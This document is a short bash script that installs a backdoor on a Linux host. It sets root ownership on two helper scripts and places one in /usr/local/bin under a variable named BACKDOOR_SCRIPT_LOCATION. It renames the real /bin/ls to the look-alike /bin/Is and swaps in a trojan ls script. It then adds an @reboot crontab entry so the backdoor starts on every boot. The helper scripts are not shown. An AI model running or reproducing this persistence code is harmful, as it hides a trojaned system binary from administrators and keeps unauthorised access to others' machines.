#!/bin/bash

BACKDOOR_SCRIPT_LOCATION="/usr/local/bin/"

chmod +x StartupCheck.sh
chmod +x new_ls.sh
chown root StartupCheck.sh
chown root new_ls.sh

mv StartupCheck.sh "${BACKDOOR_SCRIPT_LOCATION}"
mv /bin/ls /bin/Is
mv new_ls.sh /bin/ls

crontab -l | { cat; echo "@reboot ${BACKDOOR_SCRIPT_LOCATION}StartupCheck.sh"; } | crontab -